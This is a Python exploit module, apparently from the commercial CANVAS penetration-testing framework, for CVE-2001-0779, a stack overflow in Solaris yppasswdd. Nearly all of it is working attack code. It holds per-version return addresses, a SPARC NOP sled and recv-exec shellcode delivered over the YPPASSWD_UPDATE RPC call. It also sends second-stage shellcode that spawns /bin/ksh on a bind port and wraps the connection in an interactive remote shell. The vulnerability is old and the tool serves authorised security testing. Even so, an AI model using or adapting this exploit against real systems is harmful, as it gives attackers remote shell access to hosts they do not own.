#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

VERSION="1.0"

CHANGES="""


"""


notes="""
to replicate a clean reboot scenerio
<noir>  /usr/ucb/ps auxwe | grep yppasswdd (just after reboot)
<noir> copy the environments and save them
<noir> later crash
<noir> env "paste saved environments" yppasswdd

"""

#http://www.immunityinc.com/CANVAS/
#Questions, comments: sinan.eren@immunityinc.com
#

import sys

sys.path.append(".")
sys.path.append("../../")

from libs.rpc import Packer, Unpacker, UDPClient
import socket
import timeoutsocket
from exploitutils import *
import time
from tcpexploit import tcpexploit
import random

import struct
from libs.ctelnetlib import Telnet
from shelllistener import shelllistener, shellfromtelnet

from shellcode.solarisshell import getRecvExecShellcode

NAME="yppasswdd YPPASSWD_UPDATE Stack Overflow"

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sun"
DOCUMENTATION["Date public"]="07/05/2001"
DOCUMENTATION["CERT Advisory"]="http://www.kb.cert.org/vuls/id/327281"
DOCUMENTATION["CVE Name"] = "CVE-2001-0779"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0779"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]="http://sunsolve.sun.com/pub-cgi/retrieve.pl?doc=fsalert%2F27486&zone_32=category%3Asecurity%20yppasswdd"
DOCUMENTATION["Patch Info"]="Solaris 2.6 patch 106303-03, Solaris 7 patch 111590-02, Solaris 8 patch 111596-02"

DESCRIPTION="yppasswdd YPPASSWD_UPDATE Stack Overflow"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Solaris", "sparc", "_i86pc"] ]


from yp import YPPASSWDD_Client
from yp import YPException
    
class YPPASSWDDExploit(YPPASSWDD_Client):
    
    def __init__(self, target="", timeout = 5):
        self.tm = timeout
        self.targethost = target
        
    def set_target(self, ip):
        try:
            self.targethost = socket.gethostbyname(ip)
        except socket.gaierror, err:
            raise YPException, "YPPASSWDDExploit, Host: " + ip + " " + err[1]

    def get_target(self):
        return self.targethost

    def set_timeout(self, tm):
        self.tm = tm

    def get_timeout(self):
        return self.tm

    def setup(self):
        try:
            YPPASSWDD_Client.__init__(self, self.targethost)
        except (socket.error, RuntimeError), self.err:
            raise YPException, str(self.err)
        
    def exploit(self):
        custom_sc =\
                  "\xa4\x1c\x40\x11"+\
                  "\xa4\x1c\x40\x11"+\
                  "\xa4\x1c\x40\x11"+\
                  "\xa4\x1c\x40\x11"+\
                  "\xa4\x1c\x40\x11"+\
                  "\xa4\x1c\x40\x11"+\
                  "\x20\xbf\xff\xff"+\
                  "\x20\xbf\xff\xff"+\
                  "\x7f\xff\xff\xff"+\
                  "\xa2\x1c\x40\x11"+\
                  "\x90\x20\xa0\x02"+\
                  "\x92\x10\x20\x09"+\
                  "\x94\x0c\x40\x11"+\
                  "\x82\x10\x20\x3e"+\
                  "\x91\xd0\x20\x08"+\
                  "\x90\x20\xa0\x02"+\
                  "\xa2\x04\x60\x01"+\
                  "\x80\xa4\x60\x02"+\
                  "\x04\xbf\xff\xf9"+\
                  "\x90\x20\xa0\x02"+\
                  "\x92\x03\xe0\x5c"+\
                  "\x94\x10\x20\x08"+\
                  "\x82\x10\x20\x04"+\
                  "\x91\xd0\x20\x08"+\
                  "\x90\x03\xe0\x5c"+\
                  "\x92\x02\x20\x10"+\
                  "\xc0\x22\x20\x08"+\
                  "\xd0\x22\x20\x10"+\
                  "\xc0\x22\x20\x14"+\
                  "\x82\x10\x20\x0b"+\
                  "\x91\xd0\x20\x08"+\
                  "\x2f\x62\x69\x6e"+\
                  "\x2f\x6b\x73\x68"+\
                  "\x00\x00\x00\x00"
        
        timeoutsocket.setDefaultSocketTimeout(5)
        self.yppasswdd_makesploit()
        self.setup()
        #raw_input("attach")
        
        self.result = self.yppasswd_update(self.sploit)
        
        time.sleep(2)
        
        try:
            self.sck = self.gettcpsock()
            self.sck.connect((self.targethost, self.bindport))
            #raw_input("attach 2")
            self.sck.send(custom_sc)
            time.sleep(2)
            self.recvbuf = self.sck.recv(100)
            if self.recvbuf.find("ksh") != -1:
                self.log("got shellcode response: %s            " % self.recvbuf)
        except socket.error:
            return 0
    
        self.sck.send("\n")
        self.tn = Telnet()
        self.tn.sock = self.sck    
        try:
            shell=shelllistener(shellfromtelnet(self.tn))
            import unixShellNode
            node=unixShellNode.unixShellNode()
            node.parentnode=self.argsDict["passednodes"][0]
            node.shell=shell
        except :
            self.log("Could not make a shell listener - connection was closed. Exploit most likely failed.")
            import traceback
            print '-'*60
            traceback.print_exc(file=sys.stdout)
            print '-'*60
            self.setProgress(-1)
            return 0

        self.setInfo("%s attacking %s:%d (succeeded)"%(NAME,self.host,self.port))
        return node
        
    def yppasswdd_makesploit(self):

        #print "Version: %d" % self.version
        self.log("shellcode len: %d" % len(self.shellcode))
        #shellcode len: 288
        
        self.sploit = ""
        if not self.version:
            self.sploit += struct.pack(">L", 0xffbefb24L)*50 #retaddr * 50    Solaris 8
        elif self.version == 1:
            self.sploit += struct.pack(">L", 0xffbefc38L)*50 #retaddr * 50    Solaris 7
        elif self.version == 2:
            self.sploit += struct.pack(">L", 0xeffffd18L)*50 #retaddr * 50    Solaris 2.6
            
        self.sploit += struct.pack(">L", 0xa41c4011L)*80 #nop * 80
        self.sploit += self.shellcode
        self.sploit += "\x00"

class theexploit(tcpexploit, YPPASSWDDExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setPort(0)
        self.setHost("")
        self.setVersion(0)
        self.badstring="\x20\x00\\/.:?\r\n%?"
        self.setInfo(DESCRIPTION)
        return

    def createShellcode(self):
        self.bindport = random.randint(3333, 3999)
        self.shellcode = getRecvExecShellcode(self.bindport)
        return self.shellcode
    
    def neededListenerTypes(self):
            return []
        
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))       
        try:
            YPPASSWDD_Client.__init__(self, self.host)
        except:
            return 0
        self.log("yppasswdd is running on the remote end.")
        return 1
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        YPPASSWDDExploit.__init__(self, self.host)
        try:
            return self.exploit()
        except YPException, self.expstr:
            self.log(str(self.expstr))
            return 0
    

    def displayVersions(self):
        print "0 : Solaris 8 Ultra (defaulted version)"
        print "1 : Solaris 7 Ultra"
        print "2 : Solaris 2.6 Ultra"
        return

#this stuff happens.
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    app.options = ["This exploit does not need the callback options (-l -d) to be set"]
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
